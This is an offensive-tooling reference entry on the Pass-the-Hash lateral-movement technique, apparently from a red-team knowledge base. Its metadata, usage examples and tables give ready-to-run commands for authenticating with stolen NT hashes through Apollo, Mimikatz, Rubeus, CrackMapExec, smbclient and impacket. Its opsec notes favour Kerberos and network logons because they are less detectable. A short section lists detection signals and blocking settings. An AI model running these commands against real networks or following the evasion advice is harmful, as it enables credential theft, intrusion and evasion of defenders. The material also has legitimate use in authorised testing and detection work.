---
name: Pass-the-Hash
category: lateral-movement
subcategories: [pass-the-hash, ntlm-auth, credential-reuse]
tradecraft_tags: [pass-the-hash, pth, ntlm, lateral-movement, technique, credential-reuse]
mitre_attack:
  - id: T1550.002
    name: Use Alternate Authentication Material — Pass the Hash
source:
  url: https://attack.mitre.org/techniques/T1550/002/
  license: none
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [windows]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  Pass-the-hash generates a network logon (Event 4624 type 3) with NTLM authentication
  from an unusual source. The NTLM hash in the logon event is the same as the stolen hash.
  Unusual lateral movement patterns (workstation → workstation, or new source IP for DA
  hash) trigger SIEM rules. MDI detects pass-the-hash using hash-origin correlation.
  Restricted Admin Mode (RDP PTH) is detectable separately.
usage_examples:
  - description: Pass-the-hash via Apollo native pth command
    args: "Apollo: pth /user:administrator /domain:NORTH /ntlm:<nthash>"
  - description: Pass-the-hash for SMB access (impacket from Linux)
    args: "smbclient -U 'administrator%:nthash' //TARGET/C$"
  - description: Pass-the-hash via CrackMapExec
    args: "nxc smb TARGET -u administrator -H :nthash"
  - description: Pass-the-hash with Mimikatz sekurlsa::pth
    args: "sekurlsa::pth /user:administrator /domain:NORTH /ntlm:<nthash> /run:cmd.exe"
  - description: Pass-the-hash via Rubeus (only for Kerberos — need to request TGT first)
    args: "Rubeus.exe asktgt /user:administrator /rc4:<nthash> /domain:north.sevenkingdoms.local /ptt"
opsec_notes: |
  Pass-the-hash via Apollo's `pth` command is the preferred Windows-side approach — it
  spawns a process in the new credential context without requiring admin (the hash just
  needs to be valid for NTLM auth). Network logon (type 3) is standard and less suspicious
  than interactive logon. The key detection vector is unusual source IP for privileged hashes —
  DA/EA hash usage from a workstation that shouldn't have those credentials.
gotchas: |
  This is a TECHNIQUE with multiple implementation paths. Key considerations:
  1. Apollo `pth` command: spawns process with injected NTLM credential
  2. Requires the NTLM hash (RC4), not AES keys for pure NTLM PTH
  3. For Kerberos-aware services (modern DCs), use Rubeus asktgt with the hash to
     get a TGT first (this is Overpass-the-Hash / Pass-the-Key)
  4. Local admin on the target host is required for SMB PTH to most services
  5. Network logon restrictions (Deny network logon to…) can block PTH
related_ttps: [mimikatz, rubeus, crackmapexec, impacket-wmiexec, apollo]
alternatives: [overpass-the-hash, pass-the-ticket, pass-the-key]
common_args: {}
last_updated: 2026-05-29
---

# Pass-the-Hash

The technique of using an NT hash (NTLM credential) directly for authentication without
knowing the plaintext password. Windows NTLM authentication uses the NT hash in the
challenge-response protocol, so any entity with the hash can authenticate as the user.

## Implementation Paths in Sage

| Tool | Command | Context |
|------|---------|---------|
| Apollo native | `pth /user:X /domain:X /ntlm:HASH` | Windows-side, spawns process |
| Mimikatz | `sekurlsa::pth /user:X /ntlm:HASH` | Windows-side, spawns cmd.exe |
| Rubeus | `asktgt /rc4:HASH` + `/ptt` | Kerberos path (Overpass-the-Hash) |
| CrackMapExec | `nxc smb HOST -u user -H :HASH` | Linux-side SMB access |
| impacket | `wmiexec.py -hashes :HASH DOMAIN/user@HOST` | Linux-side WMI exec |

## Pass-the-Hash vs Overpass-the-Hash

| Technique | Auth protocol | Requirement |
|-----------|--------------|-------------|
| Pass-the-Hash (PTH) | NTLM | NT hash |
| Overpass-the-Hash (OPtH) | Kerberos | NT hash (to request TGT) |
| Pass-the-Key | Kerberos | AES key (from LSASS) |

Overpass-the-Hash via Rubeus is preferred on modern networks that use Kerberos:
```
Rubeus.exe asktgt /user:administrator /rc4:<nthash> /domain:DOMAIN /ptt
```
This requests a TGT using the hash as RC4 credential, then all subsequent auth
uses Kerberos (less detectable than raw NTLM PTH).

## Targets That Block NTLM

- Services requiring Kerberos: use Overpass-the-Hash
- Protected users security group members: NTLM disabled for these accounts
- NTLM restrictions via GPO: `Network security: Restrict NTLM: Outgoing NTLM traffic`
